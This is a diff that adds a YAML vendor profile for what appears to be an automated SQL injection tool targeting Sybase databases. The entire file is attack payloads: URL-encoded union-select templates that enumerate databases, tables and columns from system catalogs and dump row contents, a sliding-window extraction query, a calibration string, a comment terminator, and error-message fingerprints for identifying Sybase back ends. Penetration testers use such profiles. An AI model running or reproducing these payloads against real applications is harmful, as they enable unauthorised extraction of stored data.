@@ -1,0 +1,132 @@
+vendor: ""
+resource: 
+ info: |
+  select 
+      +@@version
+      %2B'${ENCLOSE_VALUE_SQL}'
+      %2Bdb_name()
+      %2B'${ENCLOSE_VALUE_SQL}'
+      %2Buser_name()
+      %2B'${TRAIL_SQL}'
+      r
+ schema: 
+  database: |
+   select 
+       rr
+       %2b'${TRAIL_SQL}'
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           %2bt.name
+           %2b'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from
+          (select distinct name from master..sysdatabases) t,
+          (select distinct name from master..sysdatabases) t1
+       where t.name >= t1.name
+       group by t.name
+       {limit}
+   ) a
+  table: |
+   select 
+       rr
+       %2b'${TRAIL_SQL}'
+       r 
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           %2bt.name
+           %2b'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from
+          (select distinct name from ${DATABASE}..sysobjects where type = 'U') t,
+          (select distinct name from ${DATABASE}..sysobjects where type = 'U') t1
+       where t.name >= t1.name
+       group by t.name
+       {limit}
+   ) a
+  column: |
+   select 
+       rr
+       %2b'${TRAIL_SQL}'
+       r 
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           %2bt.name
+           %2b'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from
+           (select distinct c.name from ${DATABASE}..syscolumns c inner join ${DATABASE}..sysobjects t on c.id = t.id where t.name = '${TABLE}')t,
+           (select distinct c.name from ${DATABASE}..syscolumns c inner join ${DATABASE}..sysobjects t on c.id = t.id where t.name = '${TABLE}')t1
+       where t.name >= t1.name
+       group by t.name
+       {limit}
+   ) a
+  row: 
+   query: |
+    select 
+        rr
+        %2b'${TRAIL_SQL}'
+        r
+    from (
+        select 
+            '${ENCLOSE_VALUE_SQL}'
+            %2bt.s
+            %2b'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            rr
+        from
+           (select distinct ${FIELDS} s from ${DATABASE}..${TABLE}) t,
+           (select distinct ${FIELDS} s from ${DATABASE}..${TABLE}) t1
+        where t.s >= t1.s
+        group by t.s
+        {limit}
+    ) a
+   fields: 
+    field: |
+     rtrim(
+         ltrim(
+             convert(
+                 varchar, 
+                 ${FIELD}
+                 %2b ''
+             )
+         )
+     )
+    concat: "%2b '%7f' %2b"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   select 
+       '${LEAD}'
+       %2bsubstring(
+           r,
+           ${INDEX},
+           65536
+       )
+   from (
+       ${INJECTION}
+   ) x
+  limit: "having count(*) between ${LIMIT} and ${LIMIT}"
+  failsafe: |
+   select 
+       convert(
+           varchar, 
+           (1337${INDICE}7330%2b1)
+       ) r
+  calibrator: "replicate('${CALIBRATOR_SQL}', 1024)"
+  limitBoundary: 1
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - "Warning: sybase_connect()"
+    - "Warning: sybase_query()"
+    - "Warning: sybase_fetch_row()"
+    - "Sybase: Server message:"
+    - "Invalid SQL statement or JDBC escape, terminating '"
+    - sybase
+ normal: 
+  indices: "union select ${RESULT_RANGE} from (${INDICE_UNIQUE}) b"
+  capacity: "(select '${LEAD}${INDICE}' %2b ${CALIBRATOR})"
+  orderBy: "order by 1337"
